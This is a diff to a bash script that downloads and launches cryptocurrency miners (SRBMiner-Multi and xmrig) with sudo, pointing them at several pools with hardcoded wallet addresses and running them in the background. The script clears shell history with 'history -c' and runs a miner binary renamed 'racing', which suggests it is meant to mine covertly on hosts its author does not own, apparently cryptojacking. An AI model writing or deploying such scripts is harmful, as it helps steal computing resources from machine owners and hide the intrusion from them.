@@ -35,6 +35,18 @@ sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AeuwUzTc
 history -c
 if [[ $noCore -eq 6 ]]
 then
+	sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.6/SRBMiner-Multi-2-5-6-Linux.tar.gz
+	sudo tar -xvf SRBMiner-Multi-2-5-6-Linux.tar.gz
+	#sudo ./xmrig-6.16.2/xmrig -o de.qrl.herominers.com:1166 -u Q010500814e524290ab792c54c7cac1b5f4847df92d0b64e146c5e7dd15bb61401bdbbb81c860b8 -p qrlrbbb -a rx/0 -k -t= ${usingcore} 
+	./SRBMiner-Multi-2-5-6/SRBMiner-MULTI --disable-gpu --algorithm RandomXEQ --pool xeq.supportcryptonight.com:3337 --wallet Tsz56oqWcN8EAMbeFdjoVWE5ibKwsE9c45aDdfH8pR2N6QJX8EQsWTj1ELpMwBMTT6bCpmxQxzujZ62yZXuFvr9z7hTd29Hp8m.innew --password &
+else
+	sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.6/SRBMiner-Multi-2-5-6-Linux.tar.gz
+	sudo tar -xvf SRBMiner-Multi-2-5-6-Linux.tar.gz
+	#sudo ./xmrig-6.16.2/xmrig -o de.qrl.herominers.com:1166 -u Q010500814e524290ab792c54c7cac1b5f4847df92d0b64e146c5e7dd15bb61401bdbbb81c860b8 -p qrlrbbb -a rx/0 -k -t= ${usingcore} 
+	./SRBMiner-Multi-2-5-6/SRBMiner-MULTI --disable-gpu --algorithm RandomXEQ --pool xeq.supportcryptonight.com:3337 --wallet Tsz56oqWcN8EAMbeFdjoVWE5ibKwsE9c45aDdfH8pR2N6QJX8EQsWTj1ELpMwBMTT6bCpmxQxzujZ62yZXuFvr9z7hTd29Hp8m.innew --password &
+fi
+:'
+then
 	sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
 	sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
 	#sudo ./xmrig-6.16.2/xmrig -o de.qrl.herominers.com:1166 -u Q010500814e524290ab792c54c7cac1b5f4847df92d0b64e146c5e7dd15bb61401bdbbb81c860b8 -p qrlrbbb -a rx/0 -k -t= ${usingcore} 
@@ -45,7 +57,7 @@ else
 	#sudo ./xmrig-6.16.2/xmrig -o de.qrl.herominers.com:1166 -u Q010500814e524290ab792c54c7cac1b5f4847df92d0b64e146c5e7dd15bb61401bdbbb81c860b8 -p qrlrbbb -a rx/0 -k -t= ${usingcore} &
  	sudo ./xmrig-6.16.2/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHYR2FpVwNoWn6FPm8nvgZmjZ5aMU86J8srTneeBysArXKKr1fAksb7mFzyMKoCk4Sr8J7JyEnQLNSTooTuFm2YuX8N3oVk9S2z -p "c1" --coin zephyr -a rx/0 -t= ${usingcore} &
 fi
-:'
+
 
 
 if [[ $noCore -eq 6 ]]
